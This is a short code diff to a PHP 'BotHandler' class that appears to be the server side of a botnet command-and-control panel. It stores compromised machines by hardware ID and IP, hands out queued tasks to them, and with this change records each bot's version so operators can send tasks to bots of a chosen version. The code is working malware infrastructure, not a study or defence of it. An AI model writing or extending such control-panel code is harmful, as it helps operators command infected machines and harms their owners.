@@ -86,9 +86,6 @@ class BotHandler
                 $countryName = "unknow";
             }
 
-
-
-
             $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM bots WHERE hwid LIKE ?");
             $statement->execute(array($postbot["hwid"]));
             while ($row = $statement->fetch()) {
@@ -99,8 +96,8 @@ class BotHandler
             if ($botfound) {
 
 
-                $statement = $GLOBALS["pdo"]->prepare("UPDATE bots SET lastresponse = CURRENT_TIMESTAMP(), ip = ?  WHERE hwid = ?");
-                $statement->execute(array($ip, $postbot["hwid"]));
+                $statement = $GLOBALS["pdo"]->prepare("UPDATE bots SET lastresponse = CURRENT_TIMESTAMP(), ip = ?, version = ?  WHERE hwid = ?");
+                $statement->execute(array($ip,$postbot["botversion"], $postbot["hwid"]));
 
 
                 $cmds = $GLOBALS["pdo"]->query("SELECT * FROM tasks ORDER BY id");
@@ -133,6 +130,12 @@ class BotHandler
                                         //Check if Bot Only Ececution
                                         if (!empty($filter["onlybot"])) {
                                             if ($filter["onlybot"] != $bot["id"]) {
+                                                continue;
+                                            }
+                                        }
+
+                                        if (!empty($filter["version"])) {
+                                            if ($filter["version"] != $bot["version"]) {
                                                 continue;
                                             }
                                         }
